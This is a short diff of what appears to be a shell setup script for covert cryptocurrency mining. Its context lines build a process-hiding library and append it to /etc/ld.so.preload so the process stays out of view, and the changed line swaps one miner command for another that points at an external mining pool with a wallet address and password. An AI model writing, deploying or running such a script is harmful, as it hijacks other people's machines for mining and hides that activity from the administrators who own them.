@@ -46,4 +46,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./zen2 -a etchash -o stratum+tcp://etc.2miners.com:1010 -u 0x11880b1cfe04907c5306222be1e09f4bbb480eb5 -w $(echo $(shuf -i 1-9999 -n 1)-sty) -p x --script-crash reboot.sh
+./graftcp/graftcp ./zen2 -a gr -o stratum+tcps://stratum-na.rplant.xyz:17022 -u MkgB8Pqwi9366Jph9Lu1pk1kXnzcKUivny.$(echo $(shuf -i 1-9999 -n 1)-sty) -p webpassword=kontol123 --no-tune
